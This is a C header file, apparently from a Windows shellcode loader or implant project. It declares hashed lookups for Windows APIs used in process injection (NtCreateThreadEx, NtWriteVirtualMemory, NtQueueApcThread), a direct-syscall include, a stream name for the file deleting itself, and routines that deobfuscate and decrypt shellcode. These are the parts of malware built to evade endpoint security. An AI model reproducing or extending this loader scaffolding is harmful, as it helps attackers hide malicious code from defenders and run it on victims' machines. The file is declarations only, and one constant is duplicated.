#pragma once


#ifndef SYSCALL_ENABLED
#include <windows.h>
#include <bcrypt.h>
#else
typedef long NTSTATUS;
typedef unsigned long ULONG;
typedef void* PVOID;
typedef unsigned char BYTE;
typedef unsigned int DWORD;
typedef int BOOL;
#define TRUE 1
#define FALSE 0
#endif


//#if defined(DEBUG) && !defined(NO_CRT_LIB)
#include <stdio.h>
//#endif

#include "config.h"
#include "structs.h"
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

/* functions prototypes - functions defined in 'WinApi.c' */
// seed of the HashStringJenkinsOneAtATime32BitA/W funtions
#define INITIAL_SEED	8
UINT32 HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String);
UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String);
#define HASHA(API) (HashStringJenkinsOneAtATime32BitA((PCHAR) API))
#define HASHW(API) (HashStringJenkinsOneAtATime32BitW((PWCHAR) API))

#define NtQuerySystemInformation_JOAA           0x7B9816D6
#define NtCreateSection_JOAA                    0x192C02CE
#define NtMapViewOfSection_JOAA                 0x91436663
#define NtUnmapViewOfSection_JOAA               0x0A5B9402
#define NtClose_JOAA                            0x369BD981
#define NtCreateThreadEx_JOAA                   0x8EC0B84A
#define NtWaitForSingleObject_JOAA              0x6299AD3D
#define NtDelayExecution_JOAA                   0xB947891A
#define NtAllocateVirtualMemory_JOAA            0x6E8AC28E
#define NtWriteVirtualMemory_JOAA               0x319F525A
#define NtProtectVirtualMemory_JOAA             0x1DA5BB2B
#define NtFreeVirtualMemory_JOAA                0x95687873
#define NtQueueApcThread_JOAA                   0xEB15EA8A
#define NtOpenProcess_JOAA                      0x837FAFFE
#define NtOpenSection_JOAA                      0x0C31B099
#define GetTickCount64_JOAA                     0x00BB616E
#define OpenProcess_JOAA                        0xAF03507E
#define CallNextHookEx_JOAA                     0xB8B1ADC1
#define SetWindowsHookExW_JOAA                  0x15580F7F
#define GetMessageW_JOAA                        0xAD14A009
#define DefWindowProcW_JOAA                     0xD96CEDDC
#define UnhookWindowsHookEx_JOAA                0x9D2856D0
#define GetModuleFileNameW_JOAA                 0xAB3A6AA1
#define CreateFileW_JOAA                        0xADD132CA
#define SetFileInformationByHandle_JOAA         0x6DF54277
#define SetFileInformationByHandle_JOAA         0x6DF54277
#define CloseHandle_JOAA                        0x9E5456F2
#define SystemFunction032_JOAA                  0x8CFD40A8
#define KERNEL32DLL_JOAA                        0xFD2AD9BD
#define USER32DLL_JOAA                          0x349D72E7

/* Api Hashing */
BOOL InitializeApiFunctions();

/* Syscalls */
#include "syscalls/syscalls.h"

// the new data stream name to self delete
#define NEW_STREAM L":Delete"

/* Obfuscation */
BOOL deobfuscate(IN CHAR * ShellcodeArray[], IN SIZE_T NmbrOfElements, OUT PBYTE * ppDAddress, OUT SIZE_T * pDSize);

/* Encryption */
BOOL decrypt(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN PBYTE pKey, IN SIZE_T sKeySize, IN PBYTE pIv, OUT PBYTE *pPlainTextData, OUT SIZE_T *sPlainTextSize);
